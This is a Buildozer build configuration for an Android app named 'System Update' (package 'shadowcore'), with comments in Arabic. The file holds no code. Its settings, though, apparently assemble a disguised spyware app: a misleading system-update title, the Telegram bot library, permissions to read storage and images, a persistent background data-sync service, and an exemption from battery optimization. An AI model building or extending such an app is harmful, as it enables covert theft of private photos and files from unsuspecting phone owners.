[app]
title = System Update
package.name = shadowcore
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# تم إضافة sqlite3 لضمان عمل قاعدة بيانات الأرشيف
requirements = python3,kivy,pyjnius,requests,pyTelegramBotAPI,sqlite3

orientation = portrait
fullscreen = 0

# الأذونات كاملة مع إذن مزامنة البيانات وتجاوز توفير البطارية
android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS

android.api = 33
android.minapi = 21
android.archs = arm64-v8a, armeabi-v7a
android.enable_androidx = True

# ربط الخدمة الخلفية (تأكد من الحرف الكبير S)
services = Service:service.py

# تحديد نوع الخدمة لتعمل في أندرويد 14 بدون توقف
android.service_type = dataSync
android.manifest.attributes = android:requestLegacyExternalStorage="true"

[buildozer]
log_level = 2
warn_on_root = 1
